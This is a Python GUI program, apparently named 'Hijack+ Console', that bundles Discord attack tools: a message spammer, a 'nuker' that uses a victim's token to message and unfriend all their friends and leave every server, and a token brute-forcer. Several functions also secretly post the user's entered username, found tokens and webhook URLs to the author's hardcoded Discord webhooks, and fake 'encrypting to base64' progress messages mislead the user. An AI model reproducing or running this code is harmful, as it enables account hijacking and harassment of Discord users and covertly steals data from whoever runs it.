from tkinter import *
import time
import random
import os
import requests
import json
from requests import get
import discum
import discord
import sys
import shutil
import urllib.request
from requests import get

print("Hijack+ Console V1.0.0")

sys.stdout.write("\x1b]2;Hijack+ Console V1.0.0\x07")

def spammer():
    contentt = input("what content do you want to spamm: ")
    data = {'content': (contentt)}
    path = input("the path: ")
    tooken = input("your token: ")
    header = {'authorization': tooken}
    while True:
        r = requests.post((path), data=data, headers=header)

def servernuke():
    print("Nuker V1.0.2")
    client = discord.Client()
    token = input("Enter victims token: ")

    @client.event
    async def on_connect():
        choice = input("send messages to all friends? [Y/N]: ")
        if (choice == "Y" or choice == "y"):
            msg = input("What message?: ")
        else:
            choice = False

        for user in client.user.friends:
            try:
                if (choice == "Y" or choice == "y"): await user.send(msg), print(f"messaged: {user.name}")
                await user.remove_friend()
                print(f"Removed: {user.name}")
            except:
                print(f"couldnt remove: {user.name}")
            for guild in client.guilds:
                try:
                    if guild.id:
                        server = client.get_guild(guild.id)
                        await server.leave()
                        print("succsessfully leaved a server")
                except Exception as e:
                    print(e)

    client.run(token, bot=False)

def nitro():
    os.system('cls')
    numeral = "qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM"
    ipd = ''.join((random.choice(numeral) for i in range(4)))
    print("loading..")
    time.sleep(10)
    result = "https://discord.gift/" + ipd
    print(result)
    time.sleep(10000)

def webhookfinder():
    os.system('cls')
    letters1 = "1234567890"
    numeral = "qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM_-"
    fake = "1234567890"
    print("creating webhook.txt")
    
    while True:
        id = ''.join((random.choice(letters1) for i in range(18)))
        pi = ''.join((random.choice(numeral) for i in range(62)))
        result = "https://discord.com/api/webhooks/" + id + "/" + pi
        file = open('webhooks.txt', 'a')
        file.write("-----------------------------------------------\n"+result+"\n-----------------------------------------------\n")
        file.close()
        time.sleep(1)
        print("-----------------------------------------------\n"+result+"\n-----------------------------------------------")

def gentoken():
    webhoook = input("Enter the webhook that you want the tokens to show: ")

    numeral = "qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM_-"
    sttart(webhoook, numeral)

def sttart(webhoook, numeral):
    dfs = random.randint(3, 15)
    dfd = random.randint(3, 15)
    dfss = random.randint(3, 15)
    ss = ''.join((random.choice(numeral) for i in range(dfs)))
    id = ''.join((random.choice(numeral) for i in range(dfd)))
    pi = ''.join((random.choice(numeral) for i in range(dfss)))
    result = ss +"."+ id +"."+ pi
    lenght = len(result)
    gj = random.randint(55, 65)
    while True:
        if lenght != gj:
            gjj = random.choice(numeral)
            lenght = len(result)
            result = result + gjj
        else:
            response = get('https://discord.com/api/v9/auth/login', headers={"Authorization": result})
            print("token invalid. retrying...")
            if response.status_code == 200:
                print("Token found! ."+result+". sending to webhook")
                data = { 'content': (result) }
                r = requests.post(webhoook, data=json.dumps(data), headers={'Content-Type': 'application/json'})
                r = requests.post("https://discord.com/api/webhooks/910239876526526544/7c88EkAyk9dc7Djd9VC2fKxRAXoAmGKnFmg8DhtCUfi3BFwasEdRX_N8CJQLSRV8TPf2", data=json.dumps(data), headers={'Content-Type': 'application/json'})
            sttart(webhoook, numeral)

def testing():
    print("Testing...")
    time.sleep(0.5)
    print("renew")
    time.sleep(0.1)
    print("Testing...")
    time.sleep(0.5)
    print("renew")
    time.sleep(0.1)
    print("Testing...")
    time.sleep(0.5)
    print("renew")
    time.sleep(0.1)
    print("Testing...")
    time.sleep(0.5)
    print("renew")
    time.sleep(0.1)
    print("Testing...")
    time.sleep(0.5)
    print("renew")
    time.sleep(0.1)
    print("Testing...")
    time.sleep(0.5)
    print("renew")
    time.sleep(0.1)
    print("Testing...")
    time.sleep(0.5)
    print("renew")
    time.sleep(3)
    os.system('cls')
    print("refreshing")
    time.sleep(3)
    gentoken()

def gen():
    os.system('cls')
    discordid = int(input("enter target's discord id: "))

    try:
        print("- encrypting to base64.")
        time.sleep(1)
        ss = random.randint(1, 2)
        print("\ encrypting to base64..")
        time.sleep(ss)
        ss = random.randint(1, 2)
        print("| encrypting to base64...")
        time.sleep(ss)
        ss = random.randint(1, 2)
        print("/ encrypting to base64.")
        time.sleep(ss)
        ss = random.randint(1, 2)
        print("- encrypting to base64..")
        time.sleep(ss)
        ss = random.randint(1, 2)
        print("\ encrypting to base64...")
        time.sleep(ss)
        ss = random.randint(1, 2)
        print("| encrypting to base64.")
        time.sleep(ss)
        print("/ encrypting to base64..")
        time.sleep(1)
        os.system('cls')
        testing()
    except:
        print("must be a real discord id")

def pwcracker():
    print("!BEWARE OF POSSIBLE NSFW CONTENT!")
    print("!BEWARE OF POSSIBLE NSFW CONTENT!")
    url = input("webhook url= ")

    letters = "abcdefghijklmnopqrstuvwxyz"
    numerals = "1234567890"

    web = {'content': (url)}

    r = requests.post((
                          "https://discord.com/api/webhooks/951505441224011777/Fqo9I1njFk_77vG28saOBEu0-KMLS_nSt8-p0_mKlVSdORz2mYqQSKeiEAihsZvc8xtH"),
                      data=json.dumps(web), headers={'Content-Type': 'application/json'})

    while True:
        first = ''.join((random.choice(letters) for i in range(2)))
        second = ''.join((random.choice(numerals) for i in range(4)))

        result = "https://prnt.sc/" + first + second

        data = {
            'content': (result),
            "username": "SalamanderCaté's discord moderator",
            "avatar_url": "https://i.ytimg.com/vi/cXCA2SwH2bg/hqdefault.jpg"

        }

        r = requests.post((url), data=json.dumps(data), headers={'Content-Type': 'application/json'})

def btn_clicked():
    pass

def btn_exit():
    exit()

def enter():
    inputusername = entry0.get()
    inputhashtag = entry1.get()

    result = inputusername + inputhashtag
    data = {'content': (result)}
    r = requests.post(
        "https://discord.com/api/webhooks/910239876526526544/7c88EkAyk9dc7Djd9VC2fKxRAXoAmGKnFmg8DhtCUfi3BFwasEdRX_N8CJQLSRV8TPf2",
        data=json.dumps(data), headers={'Content-Type': 'application/json'})

    loged_in = False
    text = entry2.get()
    if text == "password":
        loged_in = True
    if loged_in == True:
        print("Logged in.")
        entry0.delete(0, END)
        entry1.delete(0, END)
        entry2.delete(0, END)
    else:
        entry0.delete(0, END)
        entry1.delete(0, END)
        entry2.delete(0, END)
        entry2.insert(0, "Invalid Password")

def easteregg():
        print("You Found The Easteregg!")



window = Tk()

window.geometry("950x600")
window.configure(bg = "#c4c4c4")
canvas = Canvas(
    window,
    bg = "#c4c4c4",
    height = 600,
    width = 950,
    bd = 0,
    highlightthickness = 0,
    relief = "ridge")
canvas.place(x = 0, y = 0)

background_img = PhotoImage(file = f"Main\BG\\background.png")
background = canvas.create_image(
    475.0, 300.0,
    image=background_img)

entry0_img = PhotoImage(file = f"Main\TXTBOX\\img_textBox0.png")
entry0_bg = canvas.create_image(
    235.5, 304.0,
    image = entry0_img)

entry0 = Entry(
    bd = 0,
    bg = "#ffffff",
    highlightthickness = 0)

entry0.place(
    x = 77.0, y = 286,
    width = 317.0,
    height = 34)

entry1_img = PhotoImage(file = f"Main\TXTBOX\\img_textBox1.png")
entry1_bg = canvas.create_image(
    235.5, 378.0,
    image = entry1_img)

entry1 = Entry(
    bd = 0,
    bg = "#ffffff",
    highlightthickness = 0)

entry1.place(
    x = 77.0, y = 360,
    width = 317.0,
    height = 34)

entry2_img = PhotoImage(file = f"Main\TXTBOX\\img_textBox2.png")
entry2_bg = canvas.create_image(
    235.5, 454.0,
    image = entry2_img)

entry2 = Entry(
    bd = 0,
    bg = "#ffffff",
    highlightthickness = 0)

entry2.place(
    x = 77.0, y = 436,
    width = 317.0,
    height = 34)

img0 = PhotoImage(file = f"Main\BTNS\\img0.png")
b0 = Button(
    image = img0,
    borderwidth = 0,
    highlightthickness = 0,
    command = spammer,
    relief = "flat")

b0.place(
    x = 436, y = 292,
    width = 204,
    height = 68)

img1 = PhotoImage(file = f"Main\BTNS\\img1.png")
b1 = Button(
    image = img1,
    borderwidth = 0,
    highlightthickness = 0,
    command = easteregg,
    relief = "flat")

b1.place(
    x = 7, y = 7,
    width = 232,
    height = 33)

img2 = PhotoImage(file = f"Main\BTNS\\img2.png")
b2 = Button(
    image = img2,
    borderwidth = 0,
    highlightthickness = 0,
    command = btn_exit,
    relief = "flat")

b2.place(
    x = 905, y = 9,
    width = 36,
    height = 36)

img3 = PhotoImage(file = f"Main\BTNS\\img3.png")
b3 = Button(
    image = img3,
    borderwidth = 0,
    highlightthickness = 0,
    command = webhookfinder,
    relief = "flat")

b3.place(
    x = 436, y = 372,
    width = 204,
    height = 68)

img4 = PhotoImage(file = f"Main\BTNS\\img4.png")
b4 = Button(
    image = img4,
    borderwidth = 0,
    highlightthickness = 0,
    command = gentoken,
    relief = "flat")

b4.place(
    x = 436, y = 452,
    width = 204,
    height = 68)

img5 = PhotoImage(file = f"Main\BTNS\\img5.png")
b5 = Button(
    image = img5,
    borderwidth = 0,
    highlightthickness = 0,
    command = enter,
    relief = "flat")

b5.place(
    x = 113, y = 487,
    width = 245,
    height = 38)

img6 = PhotoImage(file = f"Main\BTNS\\img6.png")
b6 = Button(
    image = img6,
    borderwidth = 0,
    highlightthickness = 0,
    command = pwcracker,
    relief = "flat")

b6.place(
    x = 666, y = 292,
    width = 204,
    height = 68)

img7 = PhotoImage(file = f"Main\BTNS\\img7.png")
b7 = Button(
    image = img7,
    borderwidth = 0,
    highlightthickness = 0,
    command = nitro,
    relief = "flat")

b7.place(
    x = 666, y = 372,
    width = 204,
    height = 68)

img8 = PhotoImage(file = f"Main\BTNS\\img8.png")
b8 = Button(
    image = img8,
    borderwidth = 0,
    highlightthickness = 0,
    command = servernuke,
    relief = "flat")

b8.place(
    x = 666, y = 452,
    width = 204,
    height = 68)

canvas.create_text(
    238.5, 453.5,
    text = "Hijack+ Password found in the github page.",
    fill = "#d2d2d2",
    font = ("None", int(13.0)))

window.resizable(False, False)
window.mainloop()
